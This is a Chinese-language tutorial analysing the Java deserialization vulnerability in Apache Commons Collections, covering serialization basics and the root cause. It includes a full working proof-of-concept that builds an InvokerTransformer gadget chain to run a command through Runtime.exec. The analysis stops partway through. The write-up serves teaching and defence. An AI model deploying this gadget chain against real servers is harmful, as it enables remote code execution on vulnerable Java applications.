# 前言

在2015年11月6日FoxGlove Security安全团队的@breenmachine 发布了一篇长博客里，借用Java反序列化和Apache Commons Collections这一基础类库实现远程命令执行的真实案例来到人们的视野，各大Java Web Server纷纷躺枪，这个漏洞横扫WebLogic、WebSphere、JBoss、Jenkins、OpenNMS的最新版。而在将近10个月前， Gabriel Lawrence 和Chris Frohoff 就已经在AppSecCali上的一个报告里提到了这个漏洞利用思路。

目前，针对这个"2015年最被低估"的漏洞，各大受影响的Java应用厂商陆续发布了修复后的版本，Apache Commons Collections项目也对存在漏洞的类库进行了一定的安全处理。但是网络上仍有大量网站受此漏洞影响。

# java反序列化概念

序列化就是把对象的状态信息转换为字节序列\(即可以存储或传输的形式\)过程  
　　反序列化即逆过程，由字节流还原成对象  
　　注： 字节序是指多字节数据在计算机内存中存储或者网络传输时各字节的存储顺序。

**用途：**

1） 把对象的字节序列永久地保存到硬盘上，通常存放在一个文件中；  
　　2） 在网络上传送对象的字节序列。

**应用场景：**

1\) 一般来说，服务器启动后，就不会再关闭了，但是如果逼不得已需要重启，而用户会话还在进行相应的操作，这时就需要使用序列化将session信息保存起来放在硬盘，服务器重启后，又重新加载。这样就保证了用户信息不会丢失，实现永久化保存。

2\) 在很多应用中，需要对某些对象进行序列化，让它们离开内存空间，入住物理硬盘，以便减轻内存压力或便于长期保存。

比如最常见的是Web服务器中的Session对象，当有 10万用户并发访问，就有可能出现10万个Session对象，内存可能吃不消，于是Web容器就会把一些seesion先序列化到硬盘中，等要用了，再把保存在硬盘中的对象还原到内存中。

例子： 淘宝每年都会有定时抢购的活动，很多用户会提前登录等待，长时间不进行操作，一致保存在内存中，而到达指定时刻，几十万用户并发访问，就可能会有几十万个session，内存可能吃不消。这时就需要进行对象的活化、钝化，让其在闲置的时候离开内存，将信息保存至硬盘，等要用的时候，就重新加载进内存。

    Java中的`ObjectOutputStream`类的`writeObject()`方法可以实现序列化，类`ObjectInputStream`类的`readObject()`

方法用于反序列化。下面是将字符串对象先进行序列化，存储到本地文件，然后再通过反序列化进行恢复的样例代码：![](/assets/apache-java1.png)**序列号之后的数据解析**

数据开头为“AC ED 00 05”，数据内容包含了包名与类名、类中包含的变量名称、类型及变量的值。![](/assets/apache-java2.png)这里需要注意的是，`ac ed 00 05`是java序列化内容的特征，如果经过base64编码，那么相对应的是`rO0AB`：

![](/assets/apache-java3.png)

# 反序列化漏洞原理

Java应用对用户输入，即不可信数据做了反序列化处理，那么攻击者可以通过构造恶意输入，让反序列化产生非预期的对象，非预期的对象在产生过程中就有可能带来任意代码执行。

所以这个问题的根源在于类`ObjectInputStream`在反序列化时，没有对生成的对象的类型做限制；假若反序列化可以设置Java类型的白名单，那么问题的影响就小了很多。

# Apache Commons Collections反序列化漏洞分析

```
    Apache Commons Collections是一个扩展了Java标准库里的Collection结构的第三方基础库，它提供了很多强有力的数据结构类型并且实现了各种集合工具类。作为Apache开源项目的重要组件，Commons Collections被广泛应用于各种Java应用的开发。
```

。

```
    org.apache.commons.collections提供一个类包来扩展和增加标准的Java的collection框架，也就是说这些扩展也属于collection的基本概念，只是功能不同罢了。Java中的collection可以理解为一组对象，collection里面的对象称为collection的对象。具象的collection为**set，list，queue**等等，它们是**集合类型**。换一种理解方式，collection是set，list，queue的抽象。
```

![](/assets/apache-java4.png)

```
    作为Apache开源项目的重要组件，Commons Collections被广泛应用于各种Java应用的开发，而正是因为在大量web应用程序中这些类的实现以及方法的调用，导致了反序列化用漏洞的普遍性和严重性。　



     在Apache Commons Collections中有一个InvokerTransformer类实现了Transformer，主要作用是调用Java的反射机制\(反射机制是在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意一个方法和属性，详细内容请参考：[http://ifeve.com/java-reflection/\)](http://ifeve.com/java-reflection/)来调用任意函数，只需要传入方法名、参数类型和参数，即可调用任意函数。TransformedMap配合sun.reflect.annotation.AnnotationInvocationHandler中的readObject\(\)，可以触发漏洞。我们先来看一下大概的逻辑：
```

![](/assets/apache-java5.png)

先给一下POC

```
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
public class test3 {
    public static Object Reverse_Payload() throws Exception {
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] { String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] { String.class }, new Object[] { "open /Applications/Calculator.app" }) };
        Transformer transformerChain = new ChainedTransformer(transformers);

        Map innermap = new HashMap();
        innermap.put("value", "value");
        Map outmap = TransformedMap.decorate(innermap, null, transformerChain);
        //通过反射获得AnnotationInvocationHandler类对象
        Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        //通过反射获得cls的构造函数
        Constructor ctor = cls.getDeclaredConstructor(Class.class, Map.class);
        //这里需要设置Accessible为true，否则序列化失败
        ctor.setAccessible(true);
        //通过newInstance()方法实例化对象
        Object instance = ctor.newInstance(Retention.class, outmap);
        return instance;
    }

    public static void main(String[] args) throws Exception {
        GeneratePayload(Reverse_Payload(),"obj");
        payloadTest("obj");
    }
    public static void GeneratePayload(Object instance, String file)
            throws Exception {
        //将构造好的payload序列化后写入文件中
        File f = new File(file);
        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));
        out.writeObject(instance);
        out.flush();
        out.close();
    }
    public static void payloadTest(String file) throws Exception {
        //读取写入的payload，并进行反序列化
        ObjectInputStream in = new ObjectInputStream(new FileInputStream(file));
        in.readObject();
        in.close();
    }
}
```

我们先来看一下Transformer接口，该接口仅定义了一个方法transform\(Object input\)：

![](/assets/apache-java6.png)

我们可以看到该方法的作用是：给定一个Object对象经过转换后也返回一个Object，该PoC中利用的是三个实现类：`ChainedTransformer`，`ConstantTransformer`，`InvokerTransformer`



首先看InvokerTransformer类中的transform\(\)方法：  
![](/assets/apache-java7.png)

![](/assets/apache-java8.png)

我们可以看到该该方法中采用了反射的方法进行函数调用，Input参数为要进行反射的对象\(反射机制就是可以把一个类,类的成员\(函数,属性\),当成一个对象来操作,希望读者能理解,也就是说,类,类的成员,我们在运行的时候还可以动态地去操作他们.\)，iMethodName,iParamTypes为调用的方法名称以及该方法的参数类型，iArgs为对应方法的参数，在invokeTransformer这个类的构造函数中我们可以发现，这三个参数均为可控参数

接下来我们看一下ConstantTransformer类的transform\(\)方法：

![](/assets/apache-java9.png)

该方法很简单，就是返回iConstant属性，该属性也为可控参数：

最后一个ChainedTransformer类很关键，我们先看一下它的构造函数：

![](/assets/apache-java10.png)

我们可以看出它传入的是一个Transformer数组，接下来看一下它的transform\(\)方法：

![](/assets/apache-java11.png)





参考资料：

[https://www.vulbox.com/knowledge/detail/?id=11](https://www.vulbox.com/knowledge/detail/?id=11)

[https://xz.aliyun.com/t/1825](https://xz.aliyun.com/t/1825)

[https://xz.aliyun.com/t/136\#toc-1](https://xz.aliyun.com/t/136#toc-1)

[https://blog.chaitin.cn/2015-11-11\_java\_unserialize\_rce/?from=timeline&isappinstalled=0\#h2\_java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B](https://blog.chaitin.cn/2015-11-11_java_unserialize_rce/?from=timeline&isappinstalled=0#h2_java反序列化漏洞简介)

[https://www.iswin.org/2015/11/13/Apache-CommonsCollections-Deserialized-Vulnerability/](https://www.iswin.org/2015/11/13/Apache-CommonsCollections-Deserialized-Vulnerability/)

